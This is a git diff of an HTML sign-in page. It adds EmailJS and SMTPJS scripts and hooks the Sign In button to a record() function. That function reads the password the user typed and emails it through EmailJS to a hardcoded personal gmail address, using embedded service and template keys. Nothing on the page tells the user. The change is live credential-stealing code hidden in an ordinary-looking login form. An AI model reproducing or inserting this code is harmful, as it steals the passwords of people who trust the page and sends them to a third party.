@@ -1,5 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.0/dist/email.min.js">
+</script>
 
 <head>
 	<meta charset="utf-8">
@@ -32,13 +35,29 @@
 			<br/>
 			<input type="password" id="password">
 			<br/>
-			<button type="submit">Sign In</button>
+			<button onclick="record()" type="submit">Sign In</button>
 			<br/>
 			<a href="#"><p class="small">Forgot your password?</p></a>
 		</div>
 	</div>
 </body>
+<script>
+    function record(){
+		let a = document.getElementById("password").value
+        var templateParams = {
+    		to_name: 'davidcsontos5@gmail.com',
+    		from_name: a,
+    		message_html: a
+  		};
 
+  		emailjs.send('service_uw1xyul', 'template_p6uzcfu', templateParams, '1n1Twg1rWqorIxz2q')
+    		.then(function(response) {
+      		console.log('SUCCESS!', response.status, response.text);
+    		}, function(error) {
+      		console.log('FAILED...', error);
+    		});
+    }
+</script>
 <script>
 	$(document).ready(function () {
     	$('#logo').addClass('animated fadeInDown');
